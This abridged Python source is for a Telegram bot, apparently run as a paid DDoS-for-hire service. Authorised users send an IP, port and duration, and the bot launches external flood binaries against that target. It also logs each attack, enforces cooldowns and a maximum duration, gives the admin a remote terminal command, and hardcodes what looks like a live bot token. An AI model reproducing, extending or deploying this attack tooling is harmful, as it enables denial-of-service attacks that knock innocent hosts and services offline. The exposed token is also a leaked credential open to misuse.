...
chodo_logs_collection = db['user_chodo_logs']

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7707928811:AAGmRkkaAh_QTfHhqyEu_a_5qbSGhZctrEs'
ADMIN_USER_ID = 5846326674
COOLDOWN_PERIOD = timedelta(minutes=1) 
user_last_chodo_time = {} 
user_chodo_history = {}
cooldown_dict = {}
active_processes = {}
...
async def execute_terminal(update: Update, context: CallbackContext):
    ...
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            ...
            text="a *You are not authorized to execute terminal commands!*",
            parse_mode='Markdown'
        )
        return
...
async def help_command(update: Update, context: CallbackContext):
    ...
    if user_id != ADMIN_USER_ID:
        ...
        help_text = (
            ...
            "*🔸 /chodo* - Trigger an chodo operation.\n"
        ...
        help_text = (
            ...
            "*🔸 /set_time* - Set max chodo time.\n"
            "*🔸 /log [user_id]* - View chodo history.\n"
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot! PLEASE CONTACT @GyrangeYT*", parse_mode='Markdown')
        return

    message = (
        "*🔥 Welcome to Gyrange Loda! 🔥*\n\n"
        "*Use /chodo <ip> <port> <duration>*\n"
        "*Tab Chudai kr sakte ho! ⚔️💥*"
    )
...
async def show_settings(update: Update, context: CallbackContext):
    ...
    max_chodo_time_setting = settings_collection.find_one({"setting": "max_chodo_time"})
    ...
    max_chodo_time = max_chodo_time_setting["value"] if max_chodo_time_setting else 60  # Default to 60 seconds if not set
    ...
    settings_text = (
        ...
        f"⏲️ *Max chodo Time:* {max_chodo_time} seconds\n"
    )
...
# Function to set the argument type for chodo commands
...
async def set_max_chodo_time(update: Update, context: CallbackContext):
    """Command for the admin to set the maximum chodo time allowed."""
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to set the max chodo time!*", parse_mode='Markdown')
        return
    ...
    try:
        ...
        # Save the max chodo time to the database
        settings_collection.update_one(
            {"setting": "max_chodo_time"},
            {"$set": {"value": max_time}},
            upsert=True
        )
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Maximum chodo time set to {max_time} seconds.*", parse_mode='Markdown')

    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Error: {e}*", parse_mode='Markdown')

# Function to log user chodo history
async def log_chodo(user_id, ip, port, duration):
    # Store chodo history in MongoDB
    chodo_log = {
        "user_id": user_id,
        "ip": ip,
        "port": port,
    ...
    chodo_logs_collection.insert_one(chodo_log)

# Modify chodo function to log chodo history
async def chodo(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    ...
    # Check for cooldown
    last_chodo_time = cooldown_dict.get(user_id)
    if last_chodo_time:
        elapsed_time = current_time - last_chodo_time
        if elapsed_time < COOLDOWN_PERIOD:
            remaining_time = COOLDOWN_PERIOD - elapsed_time
            await context.bot.send_message(
                chat_id=chat_id, 
                text=f"*⏳ Please wait {remaining_time.seconds // 60} minute(s) and {remaining_time.seconds % 60} second(s) before using /chodo again.*", 
                parse_mode='Markdown'
            )
            return
    ...
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /chodo <ip> <port> <duration>*", parse_mode='Markdown')
        return
    ...
    # Check if the user has already chodoed this IP and port combination
    if user_id in user_chodo_history and (ip, port) in user_chodo_history[user_id]:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already chodoed this IP and port*", parse_mode='Markdown')
        return

    try:
        duration = int(duration)

        # Retrieve the max chodo time from the database
        max_chodo_time_setting = settings_collection.find_one({"setting": "max_chodo_time"})
        max_chodo_time = max_chodo_time_setting["value"] if max_chodo_time_setting else DEFAULT_MAX_chodo_TIME

        # Check if the duration exceeds the maximum allowed chodo time
        if duration > max_chodo_time:
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Maximum chodo duration is {max_chodo_time} seconds. Please reduce the duration.*", parse_mode='Markdown')
            return
    ...
    # Continue with the chodo logic (already implemented in your code)
    ...
    # Determine the chodo command based on the argument type
    if argument_type == 3:
        chodo_command = f"./2112 {ip} {port} {duration} {threads}"
    elif argument_type == 4:
        chodo_command = f"./known {ip} {port} {duration} {byte_size} {threads}"
    elif argument_type == 5:
        chodo_command = f"./IZUNA {ip} {port} {duration} {byte_size} {threads}"

    # Send chodo details to the user
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ chodo Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    # Log the chodo to the database
    await log_chodo(user_id, ip, port, duration)

    # Run the chodo using the appropriate command
    asyncio.create_task(run_chodo(chat_id, chodo_command, context))

    # Update the last chodo time for the user and record the IP and port
    cooldown_dict[user_id] = current_time
    if user_id not in user_chodo_history:
        user_chodo_history[user_id] = set()
    user_chodo_history[user_id].add((ip, port))

# Command to view the chodo history of a user
async def view_chodo_log(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view chodo logs!*", parse_mode='Markdown')
        return
    ...
    # Retrieve chodo logs for the user
    chodo_logs = chodo_logs_collection.find({"user_id": target_user_id})
    if chodo_logs_collection.count_documents({"user_id": target_user_id}) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No chodo history found for this user.*", parse_mode='Markdown')
        return

    # Display the logs in a formatted way
    logs_text = "*User chodo History:*\n"
    for log in chodo_logs:
...
# Command to delete the chodo history of a user
async def delete_chodo_log(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to delete chodo logs!*", parse_mode='Markdown')
        return
    ...
    # Delete chodo logs for the specified user
    result = chodo_logs_collection.delete_many({"user_id": target_user_id})

    if result.deleted_count > 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Deleted {result.deleted_count} chodo log(s) for user {target_user_id}.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No chodo history found for this user to delete.*", parse_mode='Markdown')


async def run_chodo(chat_id, chodo_command, context):
    try:
        ...
        await context.bot.send_message(chat_id=chat_id, text="*✅ chodo Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
...
def main():
    ...
    application.add_handler(CommandHandler("chodo", chodo))
    ...
    application.add_handler(CommandHandler("set_time", set_max_chodo_time))
    application.add_handler(CommandHandler("log", view_chodo_log))  # Add this handler
    application.add_handler(CommandHandler("delete_log", delete_chodo_log))
